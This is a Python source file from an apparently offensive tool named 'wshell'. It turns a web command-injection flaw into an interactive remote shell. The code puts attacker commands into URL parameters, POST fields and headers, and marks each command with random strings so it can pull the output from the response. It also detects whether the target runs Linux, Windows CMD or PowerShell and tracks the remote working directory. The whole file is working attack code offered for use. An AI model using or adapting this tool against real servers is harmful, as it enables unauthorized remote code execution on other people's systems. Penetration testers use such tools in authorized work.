from enum import Enum
import hashlib
import random
import re
import requests
from typing import Optional, Dict
from urllib.parse import quote as url_encode

from wshell import settings
from wshell.errors import CommandExecutionError, OsDetectionError

# Disable warnings related to unverified SSL certs
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class OSEnum(Enum):
    LINUX = "linux"
    WIN_CMD = "win-cmd"
    WIN_PSH = "win-psh"


class CommandInjector:
    """ HTTP Client with RCE capabilities via {code,command,template} injection """
    OS = None
    COMMAND_DELIMITER = ";"
    PATH_DELIMITER = "/"

    def __init__(
            self,
            http: requests.Session,
            method: str,
            url: str,
            post_data: Optional[Dict[str, str]] = None,
            headers: Optional[Dict[str, str]] = None,
            command_placeholder: str = settings.DEFAULT_COMMAND_PLACEHOLDER
    ):
        self.http = http
        self.url = url
        self.headers = headers
        self.post_data = post_data
        self.method = method

        self.command_placeholder = command_placeholder

    def execute(self, cmd: str, directory: str = ".", strip: bool = True) -> str:
        """ Execute the specified command on the target
        :param cmd: the command to execute
        :param directory: the remote directory where to execute the command
        :return: the output of the command from the target
        :raise :class:`requests.exceptions.RequestException` in case of connection errors
        :raise :class:`requests.excptions.Timeout` in case of timeout expiration
        """

        # The command to run is wrapped around some placeholder to be able to correctly identify the command output
        # even if there is some garbage or the server print the raw command in the response page too.
        #
        # Example:
        #   $ echo 7ddf32e17a6ac5ce04a8ecbf782ca509;id;echo 7ddf32e17a6ac5ce04a8ecbf782ca509
        #   7ddf32e17a6ac5ce04a8ecbf782ca509\nuid=0(root) gid=0(root) groups=0(root)7ddf32e17a6ac5ce04a8ecbf782ca509\n
        #
        # We will then extract every output delimited by '7ddf32e17a6ac5ce04a8ecbf782ca509\n' to get as output:
        #
        #   uid=0(root) gid=0(root) groups=0(root)
        #
        placeholder = hashlib.md5(f"wshell-{random.random()}".encode("utf-8")).hexdigest()
        # To make `cd` command works over HTTP shell we need to change to the desired directory
        # before the execution of every command
        cmd = f"cd {directory}{self.COMMAND_DELIMITER}{cmd}"
        cmd = f"echo {placeholder}{self.COMMAND_DELIMITER}{cmd}{self.COMMAND_DELIMITER}echo {placeholder}"

        # We don't know where the command placeholder is, so just try to resolve it anywhere
        # (GET parameters, POST data and request headers)
        url = self.url.replace(self.command_placeholder, url_encode(cmd))

        headers = dict()
        for key, value in self.headers.items():
            headers[key] = value.replace(self.command_placeholder, cmd)

        post_data = dict()
        for key, value in self.post_data.items():
            post_data[key] = value.replace(self.command_placeholder, cmd)

        response = requests.request(self.method, url, data=post_data, headers=headers)

        match = re.search(
            fr"{placeholder}(?:\r?\n)(?P<command_output>.*?){placeholder}(?:\r?\n)",
            response.text,
            re.DOTALL
        )

        if not match:
            raise CommandExecutionError("Failed to parse command output")

        command_output = match.group("command_output")
        return command_output if not strip else command_output.strip()

    def _detect_os(self) -> OSEnum:
        """ Try to identify the remote OS and return the appropriate injector """
        if self.OS:
            return self.OS

        # Running 'echo wsh${WSHELL}ell' will print:
        #   Linux:       'wshell\n'
        #   Windows CMD: 'wsh${WSHELL}ell\r\n'
        #   Windows PSH: 'wshell\r\n'
        cmd_output = self.execute("echo wsh${WSHELL}ell")
        if cmd_output == "wshell\n":
            self.OS = OSEnum.LINUX
        elif cmd_output == "wsh${WSHELL}ell\r\n":
            self.OS = OSEnum.WIN_CMD
        elif cmd_output == "wshell\r\n":
            self.OS = OSEnum.WIN_PSH
        else:
            raise OsDetectionError(f"Unrecognized output: '{cmd_output}'")

        return self.OS

    def is_linux(self) -> bool:
        """ Return True if the remote target is detected as Linux """
        return self._detect_os() is OSEnum.LINUX

    def is_windows_cmd(self) -> bool:
        """ Return True if the remote target is detected as Windows (with Command Prompt) """
        return self._detect_os() is OSEnum.WIN_CMD

    def is_windows_psh(self) -> bool:
        """ Return True if the remote target is detected as Windows (with Powershell) """
        return self._detect_os() is OSEnum.WIN_PSH

    def is_windows(self) -> bool:
        """ Return True if the remote target is detected as Windows """
        return self.is_windows_cmd() or self.is_windows_psh()

    def change_directory(self, directory: str = ".") -> str:
        """ Try to change directory and print the actual directory we are jumped in """
        raise NotImplementedError

    def current_directory(self):
        """ Return the current working directory """
        return self.change_directory()


class LinuxCommandInjector(CommandInjector):
    """ Linux HTTP Client with RCE capabilities via {code,command,template} injection """
    OS = OSEnum.LINUX

    def change_directory(self, directory: str = ".") -> str:
        return self.execute(cmd="pwd", directory=directory).strip()


class WindowsCmdCommandInjector(CommandInjector):
    """ Windows (with Command Prompt) HTTP Client with RCE capabilities via {code,command,template} injection """
    OS = OSEnum.WIN_CMD
    COMMAND_DELIMITER = "&&"
    PATH_DELIMITER = "\\"

    def change_directory(self, directory: str = ".") -> str:
        # If used with no arguments `cd` prints the current directory
        return self.execute(cmd="cd", directory=directory).strip()


class WindowsPshCommandInjector(CommandInjector):
    """ Windows (with Powershell) HTTP Client with RCE capabilities via {code,command,template} injection """
    OS = OSEnum.WIN_PSH
    PATH_DELIMITER = "\\"

    def change_directory(self, directory: str = ".") -> str:
        # On Powershell `Get-Location` returns a multiline string like:
        #
        #   PS C:\Users\> Get-Location
        #
        #   Path
        #   ----
        #   C:\Users\
        #
        # If used in a string concatenation we get the path only
        #
        return self.execute(cmd="'' + (Get-Location)", directory=directory).strip()


def get_command_injector(os: OSEnum = None, *args, **kwargs):
    """ Return an initialized command injector for the specified OS or auto-discover the more appropriate one """
    if not os:
        injector = CommandInjector(*args, **kwargs)
        if injector.is_linux():
            return LinuxCommandInjector(*args, **kwargs)
        elif injector.is_windows_cmd():
            return WindowsCmdCommandInjector(*args, **kwargs)
        elif injector.is_windows_psh():
            return WindowsPshCommandInjector(*args, **kwargs)
    else:
        if os is OSEnum.LINUX:
            return LinuxCommandInjector(*args, **kwargs)
        elif os is OSEnum.WIN_CMD:
            return WindowsCmdCommandInjector(*args, **kwargs)
        elif os is OSEnum.WIN_PSH:
            return WindowsPshCommandInjector(*args, **kwargs)
